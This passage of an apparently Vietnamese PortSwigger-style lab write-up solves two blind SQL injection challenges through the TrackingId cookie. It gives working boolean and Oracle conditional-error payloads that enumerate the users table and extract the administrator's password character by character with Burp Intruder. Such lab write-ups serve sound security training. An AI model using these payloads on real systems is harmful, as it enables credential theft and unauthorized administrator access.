![Screenshot 2025-05-27 145642](https://github.com/user-attachments/assets/f67e2085-8cc6-4e3e-8e78-84b854bdc6ab)

##### 9. Challenge 9

![Screenshot 2025-05-27 145704](https://github.com/user-attachments/assets/838afe0a-0cb4-435e-9597-3ede53eec745)

**Giải pháp**
1. Truy cập trang chủ của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu chứa `TrackingId`cookie. Để đơn giản, hãy nói rằng giá trị ban đầu của cookie là `TrackingId=xyz`.
2. Sửa đổi `TrackingId`cookie thành:
    
    `TrackingId=xyz' AND '1'='1`
    
    Xác minh rằng `Welcome back`tin nhắn xuất hiện trong phản hồi.
    
3. Bây giờ hãy đổi nó thành:
    
    `TrackingId=xyz' AND '1'='2`
    
    Xác minh rằng `Welcome back`thông báo không xuất hiện trong phản hồi. Điều này chứng minh cách bạn có thể kiểm tra một điều kiện boolean duy nhất và suy ra kết quả.
    
4. Bây giờ hãy đổi nó thành:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
    
    Xác minh rằng điều kiện là đúng, xác nhận rằng có một bảng có tên là `users`.
    
5. Bây giờ hãy đổi nó thành:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    
    Xác minh rằng điều kiện là đúng, xác nhận rằng có một người dùng được gọi là `administrator`.
    
6. Bước tiếp theo là xác định có bao nhiêu ký tự trong mật khẩu của `administrator`người dùng. Để thực hiện việc này, hãy thay đổi giá trị thành:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
    
    Điều kiện này phải đúng, xác nhận rằng mật khẩu có độ dài lớn hơn 1 ký tự.
    
7. Gửi một loạt các giá trị theo dõi để kiểm tra độ dài mật khẩu khác nhau. Gửi:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
    
    Sau đó gửi:
    
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
    
    Và cứ thế. Bạn có thể thực hiện thủ công bằng Burp Repeater, vì độ dài có thể ngắn. Khi điều kiện không còn đúng (tức là khi thông `Welcome back`báo biến mất), bạn đã xác định được độ dài của mật khẩu, thực tế là 20 ký tự.
    
8. Sau khi xác định độ dài của mật khẩu, bước tiếp theo là kiểm tra ký tự ở mỗi vị trí để xác định giá trị của nó. Điều này liên quan đến số lượng yêu cầu lớn hơn nhiều, vì vậy bạn cần sử dụng Burp Intruder. Gửi yêu cầu bạn đang xử lý đến Burp Intruder, bằng cách sử dụng menu ngữ cảnh.
9. Trong Burp Intruder, hãy thay đổi giá trị của cookie thành:
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
    
    Điều này sử dụng `SUBSTRING()`hàm để trích xuất một ký tự duy nhất từ ​​mật khẩu và kiểm tra nó với một giá trị cụ thể. Cuộc tấn công của chúng tôi sẽ tuần hoàn qua từng vị trí và giá trị có thể, kiểm tra từng giá trị theo lượt.
    
10. Đặt các điểm đánh dấu vị trí tải trọng xung quanh `a`ký tự cuối cùng trong giá trị cookie. Để thực hiện việc này, chỉ cần chọn `a`, và nhấp vào nút **Thêm §** . Sau đó, bạn sẽ thấy giá trị cookie như sau (lưu ý các điểm đánh dấu vị trí tải trọng):
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
11. Để kiểm tra ký tự ở mỗi vị trí, bạn sẽ cần gửi các tải trọng phù hợp ở vị trí tải trọng mà bạn đã xác định. Bạn có thể cho rằng mật khẩu chỉ chứa các ký tự chữ và số thường. Trong bảng điều khiển bên **Tải trọng** , hãy kiểm tra xem **Danh sách đơn giản** đã được chọn chưa và trong **Cấu hình tải trọng** , hãy thêm các tải trọng trong phạm vi a - z và 0 - 9. Bạn có thể dễ dàng chọn các tải trọng này bằng cách sử dụng danh sách thả xuống Thêm **từ danh sách .**
12. Để có thể biết khi nào ký tự đúng được gửi đi, bạn sẽ cần grep từng phản hồi cho biểu thức `Welcome back`. Để thực hiện việc này, hãy nhấp vào **Tab Cài đặt** để mở bảng điều khiển bên **Cài đặt** . Trong phần **Grep - Match** , xóa các mục hiện có trong danh sách, sau đó thêm giá trị `Welcome back`.
13. Bắt đầu tấn công bằng cách nhấp vào**Nút bắt đầu tấn công** .
14. Xem lại kết quả tấn công để tìm giá trị của ký tự ở vị trí đầu tiên. Bạn sẽ thấy một cột trong kết quả có tên là `Welcome back`. Một trong các hàng sẽ có dấu tích trong cột này. Tải trọng hiển thị cho hàng đó là giá trị của ký tự ở vị trí đầu tiên.
15. Bây giờ, bạn chỉ cần chạy lại cuộc tấn công cho từng vị trí ký tự khác trong mật khẩu để xác định giá trị của chúng. Để thực hiện việc này, hãy quay lại tab **Intruder** và thay đổi offset đã chỉ định từ 1 thành 2. Sau đó, bạn sẽ thấy giá trị cookie như sau:
    
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`
16. Thực hiện đòn tấn công đã sửa đổi, xem lại kết quả và lưu ý ký tự ở lần dịch chuyển thứ hai.
17. Tiếp tục quá trình này bằng cách kiểm tra độ lệch 3, 4, v.v. cho đến khi bạn có được toàn bộ mật khẩu.
18. Trong trình duyệt, nhấp vào **Tài khoản của tôi** để mở trang đăng nhập. Sử dụng mật khẩu để đăng nhập với tư cách là `administrator`người dùng.

**Thực hiện dò chiều dài của password**
![Screenshot 2025-05-27 145746](https://github.com/user-attachments/assets/a530e44d-5864-40e9-a56b-3e1e1abaa3e7)

**Thực hiện dò chữ cái đầu tiên của password và sau đó thay đổi đến 20 chữ cái**

![Screenshot 2025-05-27 145822](https://github.com/user-attachments/assets/f763e0a5-bb31-4024-afe0-c419dca7998b)

**Nếu thấy biến đổi của chữ số nào khác hơn so với những chữ số khác thì suy ra nó thuộc về password**

![Screenshot 2025-05-27 145849](https://github.com/user-attachments/assets/6d417c11-38ff-4dd6-a5ef-26b2077f4357)

##### 10. Challenge 10

![Screenshot 2025-05-27 145915](https://github.com/user-attachments/assets/1aef4a89-54df-4e9c-b14d-e855c5b455ff)

**Giải pháp**
1. Truy cập trang chủ của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu chứa `TrackingId`cookie. Để đơn giản, hãy nói rằng giá trị ban đầu của cookie là `TrackingId=xyz`.
2. Sửa đổi `TrackingId`cookie bằng cách thêm một dấu ngoặc kép vào đó:
    
    `TrackingId=xyz'`
    
    Xác minh rằng đã nhận được thông báo lỗi.
    
3. Bây giờ hãy đổi thành hai dấu ngoặc kép:`TrackingId=xyz''`Xác minh rằng lỗi đã biến mất. Điều này cho thấy lỗi cú pháp (trong trường hợp này là dấu ngoặc kép không đóng) đang có tác động có thể phát hiện được đến phản hồi.
4. Bây giờ bạn cần xác nhận rằng máy chủ đang diễn giải lệnh tiêm như một truy vấn SQL, tức là lỗi là lỗi cú pháp SQL chứ không phải bất kỳ loại lỗi nào khác. Để thực hiện việc này, trước tiên bạn cần xây dựng một truy vấn phụ bằng cú pháp SQL hợp lệ. Hãy thử gửi:
    
    `TrackingId=xyz'||(SELECT '')||'`
    
    Trong trường hợp này, hãy lưu ý rằng truy vấn vẫn có vẻ không hợp lệ. Điều này có thể là do loại cơ sở dữ liệu - hãy thử chỉ định tên bảng có thể dự đoán được trong truy vấn:
    
    `TrackingId=xyz'||(SELECT '' FROM dual)||'`
    
    Vì bạn không còn nhận được lỗi nữa, điều này cho thấy mục tiêu có thể đang sử dụng cơ sở dữ liệu Oracle, yêu cầu tất cả `SELECT`các câu lệnh phải chỉ định rõ ràng tên bảng.
    
5. Bây giờ bạn đã tạo ra thứ có vẻ là truy vấn hợp lệ, hãy thử gửi truy vấn không hợp lệ trong khi vẫn giữ nguyên cú pháp SQL hợp lệ. Ví dụ, hãy thử truy vấn tên bảng không tồn tại:
    
    `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
    
    Lần này, lỗi được trả về. Hành vi này cho thấy rõ ràng rằng lệnh inject của bạn đang được xử lý như một truy vấn SQL bởi back-end.
    
6. Miễn là bạn đảm bảo luôn chèn các truy vấn SQL hợp lệ về mặt cú pháp, bạn có thể sử dụng phản hồi lỗi này để suy ra thông tin chính về cơ sở dữ liệu. Ví dụ, để xác minh rằng bảng `users`tồn tại, hãy gửi truy vấn sau:
    
    `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    
    Vì truy vấn này không trả về lỗi, bạn có thể suy ra rằng bảng này tồn tại. Lưu ý rằng `WHERE ROWNUM = 1`điều kiện này rất quan trọng ở đây để ngăn truy vấn trả về nhiều hơn một hàng, điều này sẽ phá vỡ sự nối kết của chúng ta.
    
7. Bạn cũng có thể khai thác hành vi này để kiểm tra các điều kiện. Đầu tiên, hãy gửi truy vấn sau:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Xác minh rằng đã nhận được thông báo lỗi.
    
8. Bây giờ hãy đổi nó thành:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    
    Xác minh rằng lỗi biến mất. Điều này chứng minh rằng bạn có thể kích hoạt lỗi có điều kiện dựa trên sự thật của một điều kiện cụ thể. Câu `CASE`lệnh kiểm tra một điều kiện và đánh giá thành một biểu thức nếu điều kiện là đúng và một biểu thức khác nếu điều kiện là sai. Biểu thức trước chứa phép chia cho số không, gây ra lỗi. Trong trường hợp này, hai tải trọng kiểm tra các điều kiện `1=1`và `1=2`, và lỗi được nhận khi điều kiện là `true`.
    
9. Bạn có thể sử dụng hành vi này để kiểm tra xem các mục cụ thể có tồn tại trong bảng hay không. Ví dụ, sử dụng truy vấn sau để kiểm tra xem tên người dùng `administrator`có tồn tại hay không:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Xác minh rằng điều kiện là đúng (nhận được lỗi), xác nhận rằng có một người dùng được gọi là `administrator`.
    
10. Bước tiếp theo là xác định có bao nhiêu ký tự trong mật khẩu của `administrator`người dùng. Để thực hiện việc này, hãy thay đổi giá trị thành:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Điều kiện này phải đúng, xác nhận rằng mật khẩu có độ dài lớn hơn 1 ký tự.
    
11. Gửi một loạt các giá trị theo dõi để kiểm tra độ dài mật khẩu khác nhau. Gửi:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Sau đó gửi:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Và cứ thế. Bạn có thể thực hiện thủ công bằng Burp Repeater, vì độ dài có thể ngắn. Khi điều kiện không còn đúng (tức là khi lỗi biến mất), bạn đã xác định được độ dài của mật khẩu, thực tế là 20 ký tự.
    
12. Sau khi xác định độ dài của mật khẩu, bước tiếp theo là kiểm tra ký tự ở mỗi vị trí để xác định giá trị của nó. Điều này liên quan đến số lượng yêu cầu lớn hơn nhiều, vì vậy bạn cần sử dụng Burp Intruder. Gửi yêu cầu bạn đang xử lý đến Burp Intruder, bằng cách sử dụng menu ngữ cảnh.
13. Vào Burp Intruder và thay đổi giá trị của cookie thành:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Điều này sử dụng `SUBSTR()`hàm để trích xuất một ký tự duy nhất từ ​​mật khẩu và kiểm tra nó với một giá trị cụ thể. Cuộc tấn công của chúng tôi sẽ tuần hoàn qua từng vị trí và giá trị có thể, kiểm tra từng giá trị theo lượt.
    
14. Đặt các điểm đánh dấu vị trí tải trọng xung quanh `a`ký tự cuối cùng trong giá trị cookie. Để thực hiện việc này, chỉ cần chọn `a`, và nhấp vào nút "Thêm §". Sau đó, bạn sẽ thấy giá trị cookie như sau (lưu ý các điểm đánh dấu vị trí tải trọng):
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
15. Để kiểm tra ký tự ở mỗi vị trí, bạn sẽ cần gửi các tải trọng phù hợp ở vị trí tải trọng mà bạn đã xác định. Bạn có thể cho rằng mật khẩu chỉ chứa các ký tự chữ và số thường. Trong bảng điều khiển bên "Tải trọng", hãy kiểm tra xem "Danh sách đơn giản" đã được chọn chưa và trong "Cấu hình tải trọng", hãy thêm các tải trọng trong phạm vi a - z và 0 - 9. Bạn có thể dễ dàng chọn các tải trọng này bằng cách sử dụng menu thả xuống "Thêm từ danh sách".
16. Bắt đầu tấn công bằng cách nhấp vào "Nút "Bắt đầu tấn công".
17. Xem lại kết quả tấn công để tìm giá trị của ký tự ở vị trí đầu tiên. Ứng dụng trả về mã trạng thái HTTP 500 khi lỗi xảy ra và mã trạng thái HTTP 200 thông thường. Cột "Trạng thái" trong kết quả Intruder hiển thị mã trạng thái HTTP, do đó bạn có thể dễ dàng tìm thấy hàng có 500 trong cột này. Tải trọng hiển thị cho hàng đó là giá trị của ký tự ở vị trí đầu tiên.
18. Bây giờ, bạn chỉ cần chạy lại cuộc tấn công cho từng vị trí ký tự khác trong mật khẩu để xác định giá trị của chúng. Để thực hiện việc này, hãy quay lại tab Intruder ban đầu và thay đổi độ lệch được chỉ định từ 1 thành 2. Sau đó, bạn sẽ thấy giá trị cookie như sau:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
19. Thực hiện đòn tấn công đã sửa đổi, xem lại kết quả và lưu ý ký tự ở lần dịch chuyển thứ hai.
20. Tiếp tục quá trình này bằng cách kiểm tra độ lệch 3, 4, v.v. cho đến khi bạn có được toàn bộ mật khẩu.
21. Trong trình duyệt, nhấp vào "Tài khoản của tôi" để mở trang đăng nhập. Sử dụng mật khẩu để đăng nhập với tư cách là người `administrator`dùng.

![Screenshot 2025-05-27 145938](https://github.com/user-attachments/assets/34e9d801-2d92-40c1-a4b1-d32330986e67)

**Thấy biết động bất thường thì đó là đúng** 

![Screenshot 2025-05-27 150014](https://github.com/user-attachments/assets/a79d010f-7f02-41ba-857a-9678cb0e41ea)
